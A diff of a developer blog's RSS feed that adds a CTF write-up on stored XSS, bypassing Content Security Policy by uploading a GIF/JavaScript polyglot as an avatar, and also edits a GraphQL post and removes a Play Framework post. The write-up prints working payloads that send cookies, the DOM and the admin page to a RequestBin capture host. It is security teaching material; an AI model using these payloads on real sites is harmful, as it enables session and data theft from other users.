@@ -13,6 +13,182 @@
    <atom:link href="rss" rel="self" type="application/rss+xml" />
    
 	<item>
+	  <title>CTF Snippets: XSS.gif</title>
+	  <link>/devalias/2016/09/16/ctf-snippets-xss-gif/</link>
+	  <author>devalias</author>
+	  <pubDate>2016-09-16T00:00:00+10:00</pubDate>
+	  <guid>/devalias/2016/09/16/ctf-snippets-xss-gif/</guid>
+	  <description><![CDATA[
+	     <p>I was playing around with the top challenge on the CTF at <a href="http://www.sectalks.org/canberra/">SecTalks</a> the other night, and thought I&#39;d do a quick writeup of some of the techniques required; for future reference, and to help others to learn.</p>
+
+<h2>Hack the gibso.. Website</h2>
+
+<p>To start off, we were given a URL to a website that looked like a pretty standard sort of blog. Features included things like account registration/login, avatar upload, messaging between users, search, posts (not by a standard account), comments on posts (standard account), showing online users, etc. And the <code>administrator</code> was online.. interesting.</p>
+
+<p>Poking around at things, I discovered that the messaging system didn&#39;t seem to filter out HTML from the subject/message body. Easy! (or so I thought) I put together a super basic PoC XSS payload and tried it out by sending a message to my own account:</p>
+<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">'XSS'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+</code></pre></div>
+<p>I checked the message.. but for some reason it didn&#39;t pop, even though my payload seemed fine in the source. :(</p>
+<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"well"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">'XSS'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/div&gt;</span>
+</code></pre></div>
+<p>Looking at the developer console gave me some more insight. Apparently this site had <a href="https://en.wikipedia.org/wiki/Content_Security_Policy">Content Security Policy</a> enabled, and it was blocking my payload.</p>
+
+<blockquote>
+<p>Refused to execute inline script because it violates the following Content Security Policy directive: &quot;script-src &#39;self&#39;&quot;. Either the &#39;unsafe-inline&#39; keyword, a hash (&#39;sha256-kNShxzU0TYI8w1bsujgbPcQ4oIISMT9erFfdwx1ma+M=&#39;), or a nonce (&#39;nonce-...&#39;) is required to enable inline execution.</p>
+</blockquote>
+
+<p>Probably should have noticed those headers earlier.. Oh well, now to find a way around them. With spacing added for readability, the headers looked like:</p>
+<div class="highlight"><pre><code class="language-" data-lang="">Content-Security-Policy:
+  default-src 'none';
+  img-src 'self' placehold.it *.imgix.net;
+  script-src 'self';
+  connect-src 'self';
+  style-src 'self' fonts.gstatic.com fonts.googleapis.com;
+  font-src 'self' fonts.googleapis.com fonts.gstatic.com;
+</code></pre></div>
+<p>Since compromising Google or any other websites just to beat this CTF seemed out of the question, I figured I needed a way to get my script payload uploaded so that it would run from <code>self</code>.</p>
+
+<p>How about that avatar upload functionality? Well, as you might expect, it was restricted to uploading images. But surely we could find a way around that.. right? Seems so! By making use of a super simple image format, we could trick the image checker and upload our payload.</p>
+
+<p>Using the <code>GIF89a</code> format (which conveniently starts with it&#39;s name, then the rest is the GIF payload) I constructed and uploaded my new &#39;avatar&#39; <code>pwn.gif</code>, designed to steal cookies via <a href="http://requestb.in/">RequestBin</a>:</p>
+<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">GIF89a</span><span class="cm">/*.......*/</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+<span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">'http://requestb.in/secretcode?c='</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
+</code></pre></div>
+<p>This passed the file format checker (which should have seen it as a GIF), and hopefully when I included it in my XSS, the JavaScript would execute. Not the stealthiest payload, but it should do the trick. It was time to test out my new &#39;avatar&#39; by sending myself a test message:</p>
+<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"http://example.com/uploads/filenamehash.gif"</span><span class="nt">&gt;&lt;/script&gt;</span>
+</code></pre></div>
+<p>Loading the new message.. there was still no payload! :( It seems Chrome foiled my plans again:</p>
+
+<blockquote>
+<p>Refused to execute script from &#39;<a href="http://example.com/uploads/filenamehash.gif">http://example.com/uploads/filenamehash.gif</a>&#39; because its MIME type (&#39;image/gif&#39;) is not executable.</p>
+</blockquote>
+
+<p>This seemed like a browser specific security feature though, so trying it out in Safari, my payload executed. Good work Apple security! Checking the captured results on RequestBin there were no cookies. Guess I probably should have looked at that <code>HttpOnly</code> flag first.. Sometimes I just get caught up in the heat of the moment.</p>
+
+<p>Ok.. so we couldn&#39;t steal the cookies.. but what could we do? <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">Cross-Site Request Forgery (CSRF)</a> maybe? There was a CSRF token designed to prevent this, but it didn&#39;t seem to get validated. That&#39;s good.. but what should we target?</p>
+
+<p>Needing some better visibility on the situation, I decided to just steal the whole <a href="https://en.wikipedia.org/wiki/Document_Object_Model">DOM</a> and have a look around. Maybe the administrator had other cool things to look at? Hacker-eyes activate! (comments added for clarity):</p>
+<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">GIF89a</span><span class="cm">/*.......*/</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+<span class="cm">/* Wait for the page to fully load */</span>
+<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+  <span class="cm">/* Create a form to send to RequestBin */</span>
+  <span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'form'</span><span class="p">);</span>
+  <span class="nx">f</span><span class="p">.</span><span class="nx">id</span><span class="o">=</span><span class="s2">"haxForm"</span><span class="p">;</span>
+  <span class="nx">f</span><span class="p">.</span><span class="nx">method</span><span class="o">=</span><span class="s2">"post"</span><span class="p">;</span>
+  <span class="nx">f</span><span class="p">.</span><span class="nx">action</span><span class="o">=</span><span class="s2">"http://requestb.in/secretcode"</span><span class="p">;</span>
+
+  <span class="cm">/* Create a textarea to store our data */</span>
+  <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'textarea'</span><span class="p">);</span>
+  <span class="nx">t</span><span class="p">.</span><span class="nx">name</span><span class="o">=</span><span class="s2">"haxPayload"</span><span class="p">;</span>
+
+  <span class="cm">/* Capture the entire DOM and Base64 encode it */</span>
+  <span class="nx">t</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">btoa</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">documentElement</span><span class="p">.</span><span class="nx">outerHTML</span><span class="p">)</span>
+
+  <span class="cm">/* Inject the form and send it */</span>
+  <span class="nx">f</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">t</span><span class="p">);</span>
+  <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
+  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"haxForm"</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
+<span class="p">};</span>
+</code></pre></div>
+<p>Ignoring my rusty JavsScript, the new payload would create a HTML <code>form</code> element with a <code>textarea</code>, grab the entire contents of the DOM, <a href="https://developer.mozilla.org/en-US/docs/Web/API/WindowBase64/btoa">Base64 encode</a> them, stick them in the <code>textarea</code>, inject the <code>form</code> into the page, then send that off to RequestBin.</p>
+
+<p>After checking that this actually worked against my own account, I sent a message to the administrator and waited. After a minute or so, the message status changed to read. Heading over to RequestBin and decoding the captured DOM, I found the following snippet:</p>
+<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"admin.php"</span><span class="nt">&gt;</span>Administration<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
+</code></pre></div>
+<p>Sweet, let&#39;s find something juicy on that page! Reworking the payload (with a little help from <a href="https://api.jquery.com/jquery.get/">JQuery</a> that was already on the site):</p>
+<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">GIF89a</span><span class="cm">/*.......*/</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+<span class="cm">/* Wait for the page to fully load */</span>
+<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+  <span class="cm">/* Create a form to send to RequestBin */</span>
+  <span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'form'</span><span class="p">);</span>
+  <span class="nx">f</span><span class="p">.</span><span class="nx">id</span><span class="o">=</span><span class="s2">"haxForm"</span><span class="p">;</span>
+  <span class="nx">f</span><span class="p">.</span><span class="nx">method</span><span class="o">=</span><span class="s2">"post"</span><span class="p">;</span>
+  <span class="nx">f</span><span class="p">.</span><span class="nx">action</span><span class="o">=</span><span class="s2">"http://requestb.in/secretcode"</span><span class="p">;</span>
+
+  <span class="cm">/* Create a textarea to store our data */</span>
+  <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'textarea'</span><span class="p">);</span>
+  <span class="nx">t</span><span class="p">.</span><span class="nx">name</span><span class="o">=</span><span class="s2">"haxPayload"</span><span class="p">;</span>
+
+  <span class="cm">/* Inject the form */</span>
+  <span class="nx">f</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">t</span><span class="p">);</span>
+  <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">f</span><span class="p">);</span>
+
+  <span class="cm">/* Load the admin page ajax-style, Base64 encode it, send it off */</span>
+  <span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"admin.php"</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">t</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">btoa</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"haxForm"</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
+  <span class="p">});</span>
+<span class="p">};</span>
+</code></pre></div>
+<p>Using the last payload as the template, I updated it to load the <code>admin.php</code> page via ajax, Base64 encode the result and send it to RequestBin. After uploading, messaging the administrator, waiting, checking the  response and decoding; it seemed there wasn&#39;t even a need to do anything else:</p>
+<div class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;legend&gt;</span>
+  <span class="nt">&lt;h3&gt;</span>Administration<span class="nt">&lt;/h3&gt;</span>
+<span class="nt">&lt;/legend&gt;</span>
+<span class="nt">&lt;h4&gt;</span>flag{the-secret-flag-code}<span class="nt">&lt;/h4&gt;</span>
+</code></pre></div>
+<p>Mischief managed!</p>
+
+<h2>Raw Notes</h2>
+
+<p>I figured it might be fun to include the raw snippets of notes I made as I was going through this, to give a better idea of my thought process throughout:</p>
+
+<ul>
+<li>Administrator is online</li>
+<li>We can send messages to users</li>
+<li>We can inject images/etc in messages, but ContentSecurityPolicy blocks us from executing code from anywhere but self</li>
+<li>We can upload image files (can we make that other types?)
+
+<ul>
+<li>GIF89a based XSS, won&#39;t exec in chrome though..</li>
+</ul></li>
+<li>Administrator will read messages we send them (check the &#39;sent&#39; page)</li>
+<li>Admin isn&#39;t using chrome! :p</li>
+<li>The request doesn&#39;t send us any cookies! :( (they&#39;re HTTP only)</li>
+<li>CSRF token doesn&#39;t seem to actually be validated.. What can we CSRF..?</li>
+<li>Use the XSS to send us the admin&#39;s DOM</li>
+<li>Seems there&#39;s an admin.php page..</li>
+<li>Ajax the admin page</li>
+<li>Success!</li>
+</ul>
+
+<h2>Conclusion</h2>
+
+<p>This CTF was a pretty fun little challenge, tying together XSS, CSP bypass, file upload/image abuse and snooping through the DOM.</p>
+
+<p>Has this helped you learn something new? Got a better way to approach it? I&#39;d love to hear from you in the comments!</p>
+
+<h2>References</h2>
+
+<ul>
+<li>Content Security Policy
+
+<ul>
+<li><a href="https://www.owasp.org/index.php/Content_Security_Policy">Content Security Policy | OWASP</a></li>
+<li><a href="https://www.owasp.org/index.php/Content_Security_Policy_Cheat_Sheet">Content Security Policy Cheat Sheet | OWASP</a></li>
+<li><a href="http://www.html5rocks.com/en/tutorials/security/content-security-policy/">&quot;An Introduction to Content Security Policy&quot; by HTML5 Rocks</a></li>
+<li><a href="https://content-security-policy.com/">Content Security Policy References and Examples</a></li>
+</ul></li>
+<li>File Upload/Image XSS
+
+<ul>
+<li><a href="https://blackpentesters.blogspot.com.au/2013/08/gif-image-xss.html">&quot;GIF Image XSS&quot; by eXpl0i13r</a></li>
+<li><a href="http://brutelogic.com.br/blog/file-upload-xss/">File Upload XSS | Hack2Learn</a></li>
+<li><a href="https://en.wikipedia.org/wiki/List_of_file_signatures">List of File Signatures | Wikipedia</a></li>
+<li><a href="https://github.com/d0lph1n98/Defeating-PHP-GD-imagecreatefromgif">&quot;Exploiting PHP-GD imagecreatefromgif() function&quot; by d0lph1n98 </a></li>
+</ul></li>
+<li>Capturing Requests
+
+<ul>
+<li><a href="TODO">Request Bin</a></li>
+</ul></li>
+</ul>
+
+	  ]]></description>
+	</item>
+
+	<item>
 	  <title>GraphQL: Why You Should Care</title>
 	  <link>/devalias/2016/09/07/graphql-why-you-should-care/</link>
 	  <author>devalias</author>
@@ -41,7 +217,7 @@
 <li><a href="https://medium.com/apollo-stack/tutorial-building-a-graphql-server-cddaa023c035">&quot;Tutorial: How to build a GraphQL server&quot; by Jonas Helfer</a></li>
 </ul>
 
-<h2>GraphQL and Relay.. What about Redux?</h2>
+<h2><a name="graphql-relay-redux"></a>GraphQL and Relay.. What about Redux?</h2>
 
 <p>A lot of things you&#39;ll read about GraphQL on the net will talk about it quite closely with <a href="https://facebook.github.io/relay/">Relay</a>, and given they were both released by Facebook, and sort of designed to work together, it makes a lot of sense. That said, you most definitely don&#39;t need to use Relay to take advantage of the awesomeness GraphQL provides!</p>
 
@@ -64,6 +240,7 @@
 <li><a href="http://www.apollostack.com/">Apollo Stack</a></li>
 <li><a href="https://github.com/mattkrick/cashay">Cashay</a>: &quot;Relay for the rest of us&quot;</li>
 <li><a href="https://github.com/gyzerok/adrenaline">Adrenaline</a>: &quot;Simple Relay alternative&quot;</li>
+<li><a href="https://github.com/kennetpostigo/react-reach">React-Reach</a>: &quot;A small library for React to communicate with GraphQL&quot;</li>
 </ul>
 
 <h2>GraphQL vs Falcor</h2>
@@ -818,73 +995,6 @@ python -m SimpleHTTPServer 8000
 </ul></li>
 <li>That&#39;s pretty much it! After a short delay, your site should be available at <a href="http://YOURUSERNAME.github.io/my-mdwiki">http://YOURUSERNAME.github.io/my-mdwiki</a></li>
 </ul>
-
-	  ]]></description>
-	</item>
-
-	<item>
-	  <title>Play! Framework - Seperated WS Library</title>
-	  <link>/devalias/2014/06/26/play-framework-seperated-ws-library/</link>
-	  <author>devalias</author>
-	  <pubDate>2014-06-26T03:48:00+10:00</pubDate>
-	  <guid>/devalias/2014/06/26/play-framework-seperated-ws-library/</guid>
-	  <description><![CDATA[
-	     <p>So as we all (should) know, <a href="https://www.playframework.com/">Play! Framework</a> has released <a href="https://www.typesafe.com/blog/announcing-play-230">v2.3.x</a></p>
-
-<p>With it comes a <a href="https://www.playframework.com/documentation/2.3.x/Highlights23">whole range</a> of new features, including one that caught my eye:</p>
-
-<blockquote>
-<p>Play WS</p>
-
-<p>Separate library</p>
-
-<p>The WS client library has been refactored into its own library which can be used outside of Play. You can now have multiple WSClient objects, rather than only using the WS singleton.</p>
-</blockquote>
-
-<p>This was particularly exciting for me, as I&#39;ve grown to know, understand and love the simple abstractions the Play WS library provides.</p>
-
-<p>Sweet! So how do I get it in my projects? Had a look over at <a href="https://github.com/playframework">playframework@Github</a> to no avail (was expecting a new repo)</p>
-
-<p>After a little more digging, I came across the <a href="https://www.playframework.com/documentation/2.3.x/Repositories">Play! Repositories</a> page, which lead me to finding what I wanted.</p>
-
-<p>A little xml magic later and we have the following for a maven project wanting to use the Java version of the WS library:</p>
-<div class="highlight"><pre><code class="language-" data-lang="">&lt;dependencies&gt;
-    &lt;groupId&gt;com.typesafe.play&lt;/groupId&gt;
-    &lt;artifactId&gt;play-java-ws_2.10&lt;/artifactId&gt;
-    &lt;version&gt;2.3.0&lt;/version&gt;
-&lt;/dependencies&gt;
-
-&lt;repositories&gt;
-    &lt;id&gt;Typesafe Releases&lt;/id&gt;
-    &lt;url&gt;http://repo.typesafe.com/typesafe/releases/&lt;/url&gt;
-&lt;/repositories&gt;
-</code></pre></div>
-<p>Hope this saves you guys some time, and as always, happy hacking!</p>
-
-<h2>&quot;There is no started application&quot;</h2>
-
-<p>If you end up getting a &quot;There is no started application&quot; message when you try to use WS, you will need to do something like the following:</p>
-<div class="highlight"><pre><code class="language-" data-lang="">AsyncHttpClientConfig.Builder builder = new com.ning.http.client.AsyncHttpClientConfig.Builder();
-NingWSClient wsClient = new play.libs.ws.ning.NingWSClient(builder.build());
-
-// Instead of this
-//WSRequestHolder ws = WS.url(url)
-
-// Use this
-WSRequestHolder ws = wsClient.url(url)
-</code></pre></div>
-<p>See the following for more details:</p>
-
-<ul>
-<li><a href="http://stackoverflow.com/questions/24881145/how-do-i-use-play-ws-library-in-normal-sbt-project-instead-of-play">http://stackoverflow.com/questions/24881145/how-do-i-use-play-ws-library-in-normal-sbt-project-instead-of-play</a>
-
-<ul>
-<li>Scala - Using WSClient: <a href="http://www.playframework.com/documentation/2.3.x/ScalaWS">http://www.playframework.com/documentation/2.3.x/ScalaWS</a></li>
-<li>Java - Using WSClient: <a href="http://www.playframework.com/documentation/2.3.x/JavaWS">http://www.playframework.com/documentation/2.3.x/JavaWS</a></li>
-</ul></li>
-</ul>
-
-<p>(Note: The tl;dr/raw/likely most up to date notes I made for this are <a href="https://gist.github.com/alias1/288dce6b353f2a72a7d4">available as a gist</a>)</p>
 
 	  ]]></description>
 	</item>
